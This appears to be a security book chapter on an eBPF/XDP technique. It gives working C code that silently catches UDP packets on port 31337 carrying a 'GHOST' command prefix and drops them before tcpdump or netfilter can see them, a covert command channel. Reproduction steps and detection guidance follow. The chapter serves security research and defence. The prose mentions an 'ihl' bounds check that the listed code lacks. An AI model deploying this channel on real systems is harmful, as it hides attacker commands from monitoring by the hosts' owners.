---
layout: book
title: "Chapter 5b: The Ghost NIC"
date: 2025-02-04
---

# Chapter 5b: The Ghost NIC

> **See also**: [Blog post]({{ site.baseurl }}/the-ghost-nic.html) · [POC code](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch05b-ghost-nic) · [Harness entry](https://github.com/mbhatt1/dBPF/blob/master/dBPF-pocs/harness/proof.py)

> **Proof status**: `ch05b-ghost-nic` has been proved on Ubuntu 6.17.0 aarch64 (Lima VM, kernel 6.17.0-29-generic). No code changes were required.

XDP runs before the packet reaches the IP stack. That single fact is the whole primitive: an XDP program attached to a netdev sees every ingress frame before netfilter, before raw sockets, before `tcpdump`'s AF_PACKET tap, and can return `XDP_DROP` to make the packet vanish from everyone above it.

My first attempt was `cls_bpf` on ingress tc. On the same interface, AF_PACKET still saw the frames — tc ingress runs after the `ptype_all` walk in `__netif_receive_skb_core`, and that is where `tcpdump`'s tap lives. Moved to XDP; the frames stopped appearing on tcpdump. This isn't a bypass of a security control; it's XDP doing exactly what the architecture documents.

## Mechanism

```c
SEC("xdp")
int xdp_ghost(struct xdp_md *ctx) {
    void *data = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end) return XDP_PASS;
    if (eth->h_proto != bpf_htons(ETH_P_IP)) return XDP_PASS;

    struct iphdr *iph = (void *)(eth + 1);
    if ((void *)(iph + 1) > data_end) return XDP_PASS;
    if (iph->protocol != IPPROTO_UDP) return XDP_PASS;

    struct udphdr *udp = (void *)iph + (iph->ihl * 4);
    if ((void *)(udp + 1) > data_end) return XDP_PASS;
    if (udp->dest != bpf_htons(31337)) return XDP_PASS;

    char *payload = (void *)(udp + 1);
    if (payload + 5 > (char *)data_end) return XDP_PASS;
    if (__builtin_memcmp(payload, "GHOST", 5) != 0) return XDP_PASS;

    char cmd[48] = {};
    long copy_len = (char *)data_end - (payload + 5);
    if (copy_len > 47) copy_len = 47;
    bpf_probe_read_kernel(cmd, copy_len, payload + 5);

    struct evt e = { .src_ip = iph->saddr, .sport = udp->source };
    __builtin_memcpy(e.cmd, cmd, 48);
    bpf_ringbuf_output(&events, &e, sizeof(e), 0);

    return XDP_DROP;
}
```

Every bounds check is verifier-mandated. Remove any one of them and the load fails with `invalid access to packet` at the corresponding dereference. The checks are not style; they are the proof the verifier requires before it will let the program touch packet memory.

The `iph->ihl * 4` computation is the one that catches people. The verifier needs to prove the resulting pointer is within `[data, data_end]` before it allows `(void *)iph + ihl` in pointer arithmetic. The explicit `ihl < sizeof(*ip)` check (minimum 20) gives it the lower bound. Without it: `math between pkt pointer and register with unbounded min value is not allowed`.

`bpf_xdp_adjust_head` and `bpf_redirect_map` are available for the cross-namespace variant (see [chapter 15]({{ site.baseurl }}/book/act-3/chapter-15-netns-vlan-ghost.html)).

## Hook point

- `SEC("xdp")` attached to a veth (drv-mode, fallback to skb-mode).

The loader tries `XDP_FLAGS_DRV_MODE` first and falls back to `XDP_FLAGS_SKB_MODE`. On veth between kernel 4.19 and 5.2, native XDP on veth without the peer also attached would silently allow frames through — `XDP_DROP` returned but the frame continued. That bug was fixed in 5.2. The trigger script forces skb-mode with `-S` to stay deterministic across kernels.

Both modes are upstream of AF_PACKET. Both produce `XDP_DROP` semantics that defeat tcpdump. The difference is performance (native avoids sk_buff allocation), not the invisibility property.

Loader attaches via `bpf_xdp_attach(ifindex, prog_fd, flags, NULL)`. Visible in `bpftool net show` and `ip link show <if>` with `xdp prog_id`.

## Reproduction

```bash
cd dBPF-pocs/pocs/ch05b-ghost-nic
make
sudo bash trigger.sh
# BEFORE: tcpdump on veth_host captures both magic UDP packets
# AFTER: tcpdump captures 0; ringbuf shows 2 DROPPED events with cmd strings
# expect: === GHOST_COVERT_CHANNEL_PROVEN dropped=2 tcpdump=0 ===
```

The trigger creates its own veth pair and network namespace. `veth_g0` lives in the host namespace with XDP attached; `veth_g1` lives in `ghost_ns`. Packets sent from inside `ghost_ns` to `10.66.66.1:31337` with the `GHOST` prefix are intercepted on the host side before any host-side observer sees them.

## Detection

- `bpftool net show` lists every netdev with an XDP program attached.
- `ip link show <if>` shows the `xdp prog_id` field (`xdpgeneric` for skb-mode, `xdp` for drv-mode).
- `bpftool prog show id <id> --pretty` gives the BTF and loader identity.
- Netdev counter anomaly: `ip -s link show <if>` shows `dropped` incrementing without corresponding IP/UDP errors. An XDP-dropped packet leaves no other trace in the protocol stack.
- An unexpected XDP attachment on a veth is the strongest signal — containers don't usually need XDP on their own interfaces unless running Cilium or similar. On a host without a CNI that uses XDP, any `bpftool net show` output with `xdp:` lines is anomalous.

## Scope

Class IV primitive from chapter 20. This isn't a netfilter bypass in the sense of evading a rule; it's an architectural layer below netfilter, by design. Defenders who rely on `tcpdump`, nftables, or raw sockets for host-level visibility into covert channels need a second signal: XDP program inventory, CAP_BPF audit, and off-host network telemetry.

The `rx_dropped` counter on the interface does increment. A defender baselining drop counters catches the primitive even without direct XDP introspection.
